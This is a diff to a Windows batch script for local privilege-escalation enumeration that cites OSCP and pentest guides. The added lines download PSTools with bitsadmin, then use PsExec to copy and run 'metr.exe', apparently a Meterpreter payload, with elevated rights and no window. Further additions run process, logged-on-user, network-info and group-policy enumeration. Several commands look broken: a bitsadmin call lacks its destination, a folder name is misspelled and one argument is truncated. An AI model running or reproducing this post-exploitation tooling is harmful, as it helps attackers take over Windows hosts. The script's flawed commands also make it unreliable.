@@ -5,8 +5,19 @@ REM Ref: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escal
 REM http://pwnwiki.io/#!privesc/windows/index.md
 REM https://hackmag.com/security/elevating-privileges-to-administrative-and-further/
 REM https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/Windows_AD_commands.md
+REM http://pwnwiki.io/#!privesc/windows/uac.md
 
 @echo off
+
+REM downloading dependencies
+cd %HOMEPATH%/Donwloads/
+bitsadmin /transfer n "https://download.sysinternals.com/files/PSTools.zip"
+REM bitsadmin /transfer n "https://github.com/silentsignal/wpc/archive/refs/heads/wpc-2.0.zip"
+REM bitsadmin /transfer n "https://github.com/pentestmonkey/windows-privesc-check/archive/refs/heads/master.zip"
+jar xf PSTools.zip
+REM jar xf wpc-2.0.zip
+REM jar xf master.zip
+echo
 
 REM Basics
 echo "Basic Enumeration of the System"
@@ -117,6 +128,11 @@ wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, 
 wmic bios
 wmic bios LIST FULL
 wmic volume LIST BRIE
+echo
+
+REM Shows information about processes locally
+echo "Shows information about processes locally "
+qprocess * /SERVER:%COMPUTERNAME%
 echo
 
 REM Searching scheduled Tasks
@@ -257,3 +273,17 @@ REM Lost auto launch
 echo "Lost auto launch"
 autorunsc.exe -a | findstr /n /R "File\ not\ found"
 echo
+
+REM Using PsTools
+%HOMEPATH%/Donwloads/PsExec.exe \\%COMPUTERNAME% -accepteula -c -f -h -d metr.exe
+%HOMEPATH%/Donwloads/PsLoggedon.exe \\%COMPUTERNAME% 2>NUL | find "gbiago909" >NUL
+echo
+
+REM Misc
+echo "Script included gathers data about the system and stores output in files in the"
+c:\windows\system32\gathernetworkinfo.vbs
+echo
+
+REM PUlling GPO
+echo ": Extremely verbose output of GPO (Group policy) settings as applied to the current system and user"
+gpresult /z
